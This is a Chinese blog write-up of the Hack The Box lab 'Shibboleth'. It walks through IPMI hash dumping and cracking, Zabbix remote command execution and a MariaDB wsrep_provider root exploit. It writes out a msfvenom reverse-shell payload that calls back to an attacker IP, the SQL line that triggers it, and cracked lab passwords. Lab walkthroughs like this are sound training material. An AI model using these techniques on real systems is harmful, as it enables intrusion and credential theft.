---
title: Shibboleth
date: 2022-01-13 17:37:59
tags: Hack the box
categories: 中间件安全
---

## 信息收集
只做一个简单的扫描，发现只开放了web服务
![在这里插入图片描述](https://img-blog.csdnimg.cn/97c60e806c6d413eb3524efdf5cbdb9c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/19faecaea42a449ba7cf1bc2244db896.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
fuzz了一下路径，并没有发现任何有价值的路径信息
![在这里插入图片描述](https://img-blog.csdnimg.cn/7d1c7ad510a74a089d925f6c3b674ead.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们将思路转换到子域名挖掘上，发现了三个子域，我们将它们逐一访问的时候发现都同时指向同一个登录页面

```bash
wfuzz -c -u "http://shibboleth.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 26 -H "HOST:FUZZ.shibboleth.htb"
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/520287b9831e4eafa7e8f56cb80b2463.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/5cd36cb1f22d4ffc97f718b00a6170eb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
## 漏洞利用
我们对这个表单进行SQL注入漏洞的检测时，并没有发现存在注入，也没有发现对应的中间件漏洞，到这里我的思路断了。我在反思它是个靶场肯定是有漏洞点的，可能是我信息收集那块做得不够细致。因此我对靶场进行UDP端口的扫描，查看是否存在漏扫的地方。扫描时发现开放了623端口的asf-rmcp服务
![在这里插入图片描述](https://img-blog.csdnimg.cn/8d6296236bc149bb9e96a7c0219733f9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
在搜索引擎上搜索时，发现了对应的漏洞利用复现。漏洞利用的方式是使用MSF框架的对应模块进行漏洞的检测
![在这里插入图片描述](https://img-blog.csdnimg.cn/c1bceb8bee654c4d82f8bd3ecd59c2a9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/53abaaec2bdc4593a1cc5de0b865f47e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
设置好对应的参数后，发现IPMI的版本是2.0
![在这里插入图片描述](https://img-blog.csdnimg.cn/5430d56678624006bcb42e414ff0a16e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
那我们可以尝试使用下载哈希的模块，尝试能否将用户对应的hash值下载下来。我们发现对应的管理员的哈希值，我们可以将哈希值保存下来，使用hashcat进行密码破解，因为对应的加密方式是IPMI，因此我们可以筛选一下![在这里插入图片描述](https://img-blog.csdnimg.cn/8ddb20fb646844cb8c2c59c9be1da693.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
对应的编号是7300，解密出来的密码是`ilovepumkinpie1`。

```bash
hashcat -m 7300 hash /usr/share/wordlists/rockyou.txt
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/9d0ed66d101f41c593497ac9adc49a27.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/8bba274825dc42cba553281a16464f09.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们可以拿这个账号密码登录进zabbix的管理员页面
![在这里插入图片描述](https://img-blog.csdnimg.cn/85d21ce1938d44168a00a9fbfc97ee33.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
查阅对应的漏洞复现文章发现，在Configuration的hosts处，可以添加对应的脚本，实现RCE漏洞的执行
![在这里插入图片描述](https://img-blog.csdnimg.cn/aa4967975c894ae188bd13955e787130.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/99a13f40d5a6484dac50075d8cf77c10.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/b9ceff97b59546599dedd240624fca25.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们在key处添加我们要执行的RCE代码内容，点击添加并执行，期间我们开启对应的监听端口，可以反弹一个shell到本地终端上
![在这里插入图片描述](https://img-blog.csdnimg.cn/89a3911aa36b420887970de69515048e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/c0622899df61434e924f6d2b2b2ab3b2.png)
## 提权
我们确实是获得了一个终端，但是并没有权限查看到user.txt的内容，我们得想办法提权到ipmi-svc这个账户的权限上
![在这里插入图片描述](https://img-blog.csdnimg.cn/b4b5288c956948ba9dd4b917f5396c02.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们下意识可以尝试，使用Administrator账户的密码看看是否能成功。令人很意外的是，居然成功了
![在这里插入图片描述](https://img-blog.csdnimg.cn/586fc07ad39344f8858fd00d7dbdb3d1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
那下一步就是拿取root权限了，我上传了个linpeas.sh脚本到目标主机上进行检查，但是并没有发现任何有价值的信息。但是我们查看本地的端口时，发现开放了mysql服务
![在这里插入图片描述](https://img-blog.csdnimg.cn/1cabb3c6e28b43f5a42c5b3bb9d2e9c8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们进入到zabbix的目录上，筛选信息发现了数据库的密码为`bloooarskybluh`，用户名为`zabbix`
![在这里插入图片描述](https://img-blog.csdnimg.cn/2423387ead4747a28f952d7b47bab881.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/c46ad8d982584668af369bfe0217eb1c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们尝试登录到数据库上，数据库的版本为`10.3.25`
![在这里插入图片描述](https://img-blog.csdnimg.cn/c99b6814e5f94d5796ef64db705d2fe9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我尝试过搜寻数据库中对应账户的密码进行解密，但是都无功而返。切换一种思路，我搜寻到了mysql对应版本的漏洞信息。文章中说明了这个版本的mysql存在RCE漏洞
![在这里插入图片描述](https://img-blog.csdnimg.cn/88dd5b53214b46a1b29cf0f8250eadfd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我在github上找到一个漏洞利用的脚本，这是链接[https://github.com/Al1ex/CVE-2021-27928](https://github.com/Al1ex/CVE-2021-27928)
![在这里插入图片描述](https://img-blog.csdnimg.cn/11fbc233c5ad4caa848e064466e57189.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
根据提示来，我们先生成一个对应的payload，再开启监听反弹一个root的shell到本地上

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.30 LPORT=4445 -f elf-so -o payload.so
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/ba5f1d4ea3274eadaa72fd212301296f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
然后把payload文件上传到目标主机上
![在这里插入图片描述](https://img-blog.csdnimg.cn/d37c053a543346549047aa87a86b4409.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
最后登录到mysql里，执行这么一段指令`SET GLOBAL wsrep_provider="/tmp/payload.so";`，获得root权限
![在这里插入图片描述](https://img-blog.csdnimg.cn/cab9ce62d2c54b2d8ef5236665166e5d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
## 总结
这个靶机还是相当出色的，首先一般的扫描只能扫描到80的web服务，因为web服务最多就只能发掘到子域的登录表单上，之后就断思路了。所以还得扫描UDP的端口，这个就不是特别多人能够想得到，进行登录操作后，又得考验对zabbix的RCE漏洞利用，这个要求也比较高，然后再到root的提权上，很充分地考查了对中间件安全的知识，总体来说这是一个相当出色的靶机。
